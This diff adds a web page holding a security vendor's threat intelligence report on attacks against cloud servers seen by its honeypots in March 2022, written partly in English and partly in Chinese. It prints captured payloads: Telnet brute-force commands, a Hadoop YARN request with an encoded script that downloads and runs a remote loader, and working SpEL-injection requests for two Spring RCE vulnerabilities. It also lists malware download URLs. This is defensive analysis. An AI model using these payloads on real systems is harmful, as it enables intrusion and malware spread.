@@ -1,0 +1,241 @@
+<div>
+19 April 2022
+/
+<a href="https://blog-netlab-360-com.translate.goog/tag/gong-you-yun-wei-xie-qing-bao/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp">Public Cloud Threat Intelligence</a>
+<h1 class="post-full-title">Public Cloud Cybersecurity Threat Intelligence (202203)</h1>
+<h3 id="-">Overview</h3>
+ This article focuses on the scanning attacks of key assets on the cloud, the analysis of the overall attack situation of cloud servers, and the attack threats of popular vulnerabilities and malicious programs.
+ 
+<ul>
+<li><a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://netlab.360.com/zh/honeypot">The 360 ​​Advanced Threat Hunting Honeypot System</a> found 120,000 cloud server IPs around the world, and carried out network scanning, vulnerability attacks, and spreading malware. Including the server IP of 156 domestic units, involving large central enterprises, government agencies and other industries.</li>
+<li><a href="https://blog-netlab-360-com.translate.goog/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp">Spring manufacturers have disclosed three key vulnerabilities in a row, CVE-2022-22947, CVE-2022-22963, and CVE-2022-22965. This article will analyze the first two vulnerabilities in detail, and click here to view</a> the details of the third vulnerability .</li>
+<li>More than 800 million threat attacks were recorded this month (including more than 740 million vulnerability attacks and over 55 million malware spread), and more than 680,000 new IoCs were added. Among them, the vulnerability attacks targeting IoT devices are on the rise.</li>
+</ul>
+<h3 id="--1">Scanning attacks on key assets on the cloud</h3>
+ In March, we detected abnormal scans and attacks on 156 key public cloud assets across the country.
+ 
+<p>With the continuous migration of business to the cloud, the number of network security incidents and threats on public cloud platforms remains high. Domestic key industries, including but not limited to my country's scientific research institutions, large enterprises, governments and institutions, have become the key targets of attackers. , a total of 156 attack sources.</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-54.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>According to the source of cloud service providers, we found that the cloud service providers of key IPs in my country are mainly used by Alibaba Cloud, followed by Tencent Cloud.</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-51.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>From the perspective of vulnerability exploitation, attackers mainly attack key IPs of my country's public cloud through SSH brute force cracking, Gitlab remote command execution vulnerability, and Redis remote command execution vulnerability attack methods.</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-52.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>The following table shows some of these cases:</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-29.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>Case 1: The Alibaba Cloud server with the IP address of 39.101.*.* located in Beijing belongs to the liaison office. Accessing the corresponding domain name can enter the ** platform of the unit. Its IP has Telnet violence against the honeypot node in early March. Cracking behavior:</p>
+<code>��telnetadmin
+telnetadmin
+enable
+system
+shell
+sh
+/bin/busybox IZ1H9
+</code>
+<p>案例2：位于上海的IP地址为118.89.*.*的腾讯云IP属于***办公室，该IP有Apache Tomcat暴力破解,ThinkPHP漏洞, Hadoop YARN ResourceManager未授权访问漏洞等5个漏洞利用或暴力破解的恶意行为，并传播了TrojanDownloader类的恶意软件，以Hadoop YARN ResourceManager未授权访问漏洞为例，攻击Payload如下所示：</p>
+<code>POST /ws/v1/cluster/apps HTTP/1.1
+Host: {target}:8088
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+Content-Length: 3742
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+Accept-Encoding: gzip
+Connection: close
+{
+ "application-id": "application_1526990652950_72948",
+ "application-name": "i24jndw5",
+	"am-container-spec": { "commands": { "command": "echo Yz1odHRwOi8vMTk0LjE0NS4yMjcuMjEvbGRyLnNoP2Y5ZWRhYQpleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KZm9yIGkgaW4gMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMTtkbyBwcyAtZWZ8Z3JlcCAtdiBmYzZifGdyZXAgJ2ZjNmJcfGVwIGN1clx8ZXAgd2dlXHxlcCBpbXAnfGF3ayAne3ByaW50ICQzfSd8eGFyZ3MgLUkgJSBraWxsIC05ICU7ZG9uZQoKcGtpbGwgLTkgLWYgJ3NvXC50eHQnCnBraWxsIC05IC1mICdiYXNoIC1zIDM2NzMnCnBraWxsIC05IC1mIDgwMDUvY2M1CnBraWxsIC05IC1mIHJlYWRka2sKcGtpbGwgLTkgLWYgJ2ZsdWVuY2UvaW5zdGFsbFwuc2gnCnBraWxsIC05IHJlYWRkaQpwa2lsbCAtOSBsYWJraWxsCnBraWxsIC05IGp1aWNlU1NICnBraWxsIC05IHBvc3RncmVzd2sKcGtpbGwgLTkgcG9sc2thCnBraWxsIC05IC1mICdcLi9cLicKcGtpbGwgLTkgLWYgJy90bXAvXC4nCnBraWxsIC05IC1mIGtlcm5lbHgKcGtpbGwgLTkgLWYgZ3Jlcy1zeXN0ZW0KcGtpbGwgLTkgLWYgZ3Jlcy1rZXJuZWwKcGtpbGwgLTkgLWYgcGFzdGViaW4KCmZvciBpIGluICQocHMgLWVmIHwgZ3JlcCBhdGxhc3NpYW4gfCBhd2sgJ3twcmludCAkMn0nKTsgZG8KICBpZiBscyAtYWwgL3Byb2MvJGkgfCBncmVwIGV4ZSB8IGdyZXAgImJpbi9wZXJsXHwvZGV2L3NobSI7IHRoZW4KICAgIGtpbGwgLTkgJGkKICBmaQpkb25lCgppZiBbICEgLXggIiQoY29tbWFuZCAtdiBjdXJsKSIgLWEgISAteCAiJChjb21tYW5kIC12IHdnZXQpIiBdOyB0aGVuCiAgY2QgL3RtcCB8fCBjZCAvdmFyL3RtcAogIGNoYXR0ciAtaSBkOyBjaGF0dHIgLWkgZGxyOyBybSAtcmYgZCBkbHIKICBlY2hvIGYwVk1SZ0VCQVFBQUFBQUFBQUFBQUFJQUF3QUJBQUFBSklNRUNEUUFBQURNQXdBQUFBQUFBRFFBSUFBREFDZ0FCUUFFQUFFQUFBQUFBQUFBQUlBRUNBQ0FCQWlyQXdBQXF3TUFBQVVBQUFBQUVBQUFBUUFBQUt3REFBQ3Nrd1FJckpNRUNBQUFBQUFFQUFBQUJnQUFBQUFRQUFCUjVYUmtBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFHQUFBQUJBQUFBRldKNVErMlZRZ1B0a1VNRDdaTkVNSGlHTUhnRUFuQ0Q3WkZGTUhoQ0YwSndnblJpY3FKeUlIaUFQOEFBTUhpQ01IZ0dBblFpY3FCNFFBQS93REI2aGpCNlFnSnlnblF3MVdKNVlQc0VQOTFDR29CNkVRQ0FBQ0R4QkRKdzFXSjVZUHNFUDkxQ0dvRzZDOENBQURKdzFXSjVZUHNDUDkxRVA5MURQOTFDR29GNkJjQ0FBREp3MVdKNVlQc0hJdEZDSWxGOUl0RkRJbEYrSXRGRUlsRi9JMUY5RkJxQTJwbTZQQUJBQURKdzFXSjVZUHNDUDkxRVA5MURQOTFDR29FNk5nQkFBREp3MVdKNVlQc0NQOTFFUDkxRFA5MUNHb0Q2TUFCQUFESncxV0o1WVBzSEl0RkNJbEY5SXRGRElsRitJdEZFSWxGL0kxRjlGQnFBV3BtNkprQkFBREp3MVc0ZllNRUNJbmxWMVpUZ2V5c0FBQUE2d0ZBZ0RnQWRmb3RmWU1FQ0ltRlVQLy8vMUJxQW1pRGd3UUlhZ0hvZHYvLy8yb1ZhT01BQUFCb2tRQUFBR2pDQUFBQVpzZEY0QUlBWnNkRjRnQlE2S2IrLy8rRHhCeG8vd0VBQUdoQkFnQUFhSWFEQkFpSlJlVG8rLzcvLzRQRURHb0FhZ0ZxQW9uSDZGci8vLytEeEJDRCtQK0p4blFGZy8vL2RRMkQ3QXhxQWVpci92Ly9nOFFRVUdvUWpVWGdVRmJvMnY3Ly80UEVFSVhBaWNONUhGRDMyMm9CYUlxREJBaHFBZWpuL3YvL2lSd2s2SG4rLy8rRHhCQ0xuVkQvLy85UWc4TVhVMmlNZ3dRSVZ1akcvdi8vZzhRUU9kaDBEWVBzREdvRDZFLysvLytEeEJBeDIxQnFBWTFGODFCVzZMdisvLytEeEJCSWRBMkQ3QXhxQk9ndC92Ly9nOFFRRDc1Rjg4SGpDQW5EZ2ZzS0RRb05kYzlSYUlBQUFBQ05uV0QvLy85VFZ1aUUvdi8vZzhRUWhjQitEbEpRVTFmb1hQNy8vNFBFRU92WWcrd01WdWo5L2YvL2lUd2s2UFg5Ly8rRHhBeHFBV2lwZ3dRSWFnSG9OZjcvLzhjRUpBVUFBQURvdy8zLy80UEVFSTFsOUZ0ZVgxM0RWWW5sWGVscy92Ly9rSkNRVlZkV1U0dHNKQ3lMZkNRb2kzUWtKSXRVSkNDTFRDUWNpMXdrR0l0RUpCVE5nRnRlWDEwOUFmRC8vdytEQVFBQUFNT0Q3QXlKd3ZmYTZBa0FBQUNKRUlQSS80UEVETU80ckpNRUNNTmhiV1EyTkFBakNnQmtiSElBUHdCSFJWUWdMMk4xY213dFlXMWtOalFnU0ZSVVVDOHhMakFOQ2cwS0FDTUFBQUF1YzJoemRISjBZV0lBTG5SbGVIUUFMbkp2WkdGMFlRQXVZbk56QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXNBQUFBQkFBQUFCZ0FBQUpTQUJBaVVBQUFBNlFJQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBUkFBQUFBUUFBQURJQUFBQjlnd1FJZlFNQUFDNEFBQUFBQUFBQUFBQUFBQUVBQUFBQkFBQUFHUUFBQUFnQUFBQURBQUFBckpNRUNLd0RBQUFFQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFFQUFBQURBQUFBQUFBQUFBQUFBQUNzQXdBQUhnQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQT18YmFzZTY0IC1kID4gZAogIGNobW9kICt4IGQ7IC4vZHx8Li9kOyBybSAtZiBkOyBjaG1vZCAreCBkbHIKZmkKCihjdXJsICRjfHxjdXJsICRjfHx3Z2V0IC1xIC1PLSAkY3x8Y3VybCAtayAkY3x8Y3VybCAtayAkY3x8d2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIC1xIC1PLSAkY3x8Li9kbHIgJGN8fC4vZGxyICRjKXxzaAo=|base64 -d|sh" } },
+ "application-type": "YARN"
+}</code>
+<h3 id="--2">热门漏洞攻击</h3>
+ 2022年3月1日，Spring厂商发布高危漏洞CVE-2022-22947，可能使其应用程序受到代码注入攻击。同月24日再次公开漏洞CVE-2022-22963，该漏洞影响JDK 9+上的SpringMV及WebFlux应用程序，我们发现攻击者正在利用该漏洞传播恶意软件。
+ 
+<p>（1）Spring Cloud Gateway 远程代码执行漏洞(CVE-2022-22947)</p>
+<p>漏洞信息</p>
+<ul>
+<li>影响范围：Spring Cloud Gateway 3.1.0、3.0.0-3.0.6及不受支持的旧版本</li>
+<li>CVE编号：CVE-2022-22947</li>
+<li>披露日期：2022.03.01</li>
+<li>CVSS 3.0评分：10.0</li>
+<li>影响设备量级：千万级</li>
+</ul>
+<p>下图为该漏洞的攻击源IP与会话数量趋势，我们发现攻击者IP的数量和攻击者尝试利用该漏洞的次数呈现上升趋势。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-37.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>漏洞详情及补救措施<a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://tanzu.vmware.com/security/cve-2022-22947">点此查看</a>，以下是该漏洞的技术细节分析。</p>
+<h4 id="--3">[漏洞补丁]</h4>
+<p>在spring-cloud-gateway-server/src/main/java/org/springframework/ cloud/gateway/support/ShortcutConfigurable.java中，将getValue函数中的StandardEvaluationContext替换为GatewayEvaluationContext修复SpEL表达式注入：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112458040.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<h4 id="--4">[漏洞分析]</h4>
+<p>查看函数getValue的调用，在RouteDefinitionLocator函数中，根据RouteDefinition提取GatewayFilter：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112517737.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>根据官方文档，通过Actuator API可创建路由：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112829328.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> 定位Actuator的控制器AbstractGatewayControllerEndpoint，根据RouteDefinition解析数据：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112614972.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> 设置断点，发送蜜罐系统捕获的payload数据：</p>
+<code>POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 127.0.0.1:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 329
+{
+ "id": "hacktest",
+ "filters": [{
+ "name": "AddResponseHeader",
+ "args": {
+ "name": "Result",
+ "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+ }
+ }],
+ "uri": "<a class="vglnk" href="http://example.com" rel="nofollow">http://example.com</a>"
+}
+</code>
+<p> validateRouteDefinition函数调用isAvailable函数对name进行校验：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112631826.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> 动态调试有以下name符合条件：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112701296.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> 路由创建成功后，发送蜜罐系统捕获的refresh：</p>
+<code>POST /actuator/gateway/refresh HTTP/1.1
+Host: 127.0.0.1:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+</code>
+<p> 成功触发表达式解析：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220408112711977.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>（2）Spring Cloud Function SpEL表达式远程代码执行漏洞(CVE-2022-22963)</p>
+<p>漏洞信息</p>
+<ul>
+<li>影响版本：3.0.0.RELEASE &lt;= Spring Cloud Function &lt;= 3.2.2</li>
+<li>CVE编号：CVE-2022-22963</li>
+<li>披露日期：2022.03.24</li>
+<li>CVSS3.0评分：9.8</li>
+<li>影响设备量级：万级</li>
+</ul>
+<p>自24日漏洞公布后，已有攻击者尝试利用此漏洞进行恶意软件传播，如下图所示。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-55.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>漏洞详情及补救措施<a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://tanzu.vmware.com/security/cve-2022-22947">点此查看</a>，以下是该漏洞的技术细节分析。</p>
+<h4 id="--5">[漏洞补丁]</h4>
+<p> 在functionFromExpression新增bool类型参数isViaHeader ：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407110944549.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> 通过isViaHeader 判断，当请求数据的header头存在spring.cloud.function.routing-expression头时，调用SimpleEvaluationContext函数处理，SimpleEvaluationContext 针对不需要SpEL语言语法的全部范围且受到有意限制的表达式类别, SpEL无法调用Java类对象、引用bean, 从而修复SPEL表达式注入漏洞。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407110934910.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<h4 id="--6">[漏洞分析]</h4>
+<p> 通过RoutingFunction发现位于FunctionWebRequestProcessingHelper的可疑调用：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407111013999.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>根据FunctionWebRequestProcessingHelper.processRequest调用情况发现，FunctionController接口的post请求存在调用：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407111032526.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> 设置断点，发送蜜罐系统捕获的payload数据：</p>
+<code>POST /functionRouter HTTP/1.1
+Host: 127.0.0.1:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+test
+</code>
+<p> 在FunctionWebRequestProcessingHelper.processRequest()函数处理中，判断request对应的function为RoutingFunction类型时，将进入RoutingFunction.apply()处理：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407111046682.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> RoutingFunction.apply调用route函数，route函数从Header提取spring.cloud.function.routing-expression，然后调用functionFromExpression函数处理：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407111057525.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p> functionFromExpression函数未对request做任何过滤，调用expression.getvalue()函数，存在SpEL表达式解析漏洞：</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-20220407111110825.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<h3 id="--7">云服务器攻击总体情况</h3>
+ 三月份共监测到全球超12余万个云服务器（源IP）异常访问蜜罐节点并与之交互，其中3万多个IP发生漏洞扫描和攻击行为，超7000个IP发生恶意软件传播行为，近2万个IP发生密码爆破攻击行为。
+ 
+<p>三月份我们通过对全球公有云服务器的监测，共捕获云服务器威胁攻击事件近6200万次，其中包括漏洞攻击4700余万次（涉及3万多个云服务器），漏洞攻击事件共涉及1118个漏洞、传播恶意软件近1400万次（涉及7000多个云服务器）。</p>
+<p>攻击态势主要聚焦在针对Web应用和数据库的攻击、僵尸网络攻击等，攻击方式主要为暴力破解、远程命令/代码执行等，其中需要关注的是针对IoT设备的漏洞攻击逐步呈上升趋势，我们捕获到针对IoT攻击的攻击源数量超3000个，尝试攻击的会话数超200余万次。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-42.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>全球云服务器的三月数据中，捕获超2000个，日均传播次数超16万余次，涉及恶意程序家族38个，其中按样本捕获量以Mirai家族及其变种为首，按传播次数排名前三位的为CoinMiner、Mirai、Rootkit家族。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-50.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>其中国内云服务器，捕获恶意程序样本数量超400余个，日均传播次数10万余次，涉及恶意程序家族近30个，其中按样本捕获量以CoinMiner家族及其变种为首，按传播次数排名前三位的为CoinMiner、Rootkit、TrojanDownloader家族。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-53.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>从云服务商的情况来看，本月数量前5的云服务商是腾讯云、DigitalOcean、阿里云、亚马逊AWS和微软Azure。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-33.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>从漏洞攻击针对的厂商、产品分析，各类漏洞攻击的IP数量较二月有大幅度提升，尤其专注于对Redis、Docker等设备的重点攻击。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-12.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>从恶意软件传播情况分析，恶意挖矿类（CoinMiner）传播次数最多，木马下载器（TrojanDownloader）的传播源IP数量最多，超过5500个。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-14.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>oracle.zzhreceive.top和bbq.zzhreceive.top是被最多IP使用的下载服务器。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-38.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<p>在密码爆破攻击方面，81.3%的云服务器IP集中在SSH协议的暴力破解上，其次是Telnet协议，占比8.8%。腾讯云和DigitalCloud是暴力破解攻击源IP最多的云服务商，3月份分别有4700+和4300+个攻击源IP。在暴力破解会话数方面，DigitalCloud遥遥领先，有多达3052万次暴力破解会话。</p>
+<figure class="kg-card kg-image-card">
+<img class="kg-image" src="https://blog.netlab.360.com/content/images/2022/04/image-34.png" style="max-width:80%;height:auto;width:auto;"/>
+</figure>
+<h3 id="">联系我们</h3>
+<p>Interested readers can contact us on <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://twitter.com/360Netlab">twitter</a> or by mail at netlab[at]360.cn .</p>
+<h3 id="ioclist">IoC List</h3>
+<p>URL:</p>
+<code><a class="vglnk" href="http://14.1.98.226:8880/7z" rel="nofollow">http://14.1.98.226:8880/7z</a>
+<a class="vglnk" href="http://51.81.133.90/NWWW.6" rel="nofollow">http://51.81.133.90/NWWW.6</a>
+<a class="vglnk" href="http://51.81.133.90/qweasd" rel="nofollow">http://51.81.133.90/qweasd</a>
+<a class="vglnk" href="http://14.1.98.226:8880/ff.elf" rel="nofollow">http://14.1.98.226:8880/ff.elf</a>
+</code>
+<p>md5:</p>
+<code>b9bcb150c1449dcc6a69ff1916a115ce
+8c47779d3ad0e925461b4fbf7d3a139d
+392f13b090f54438b3212005226e5d52
+24afae2eee766cbabf8142ef076ce1
+</code>
+</div>
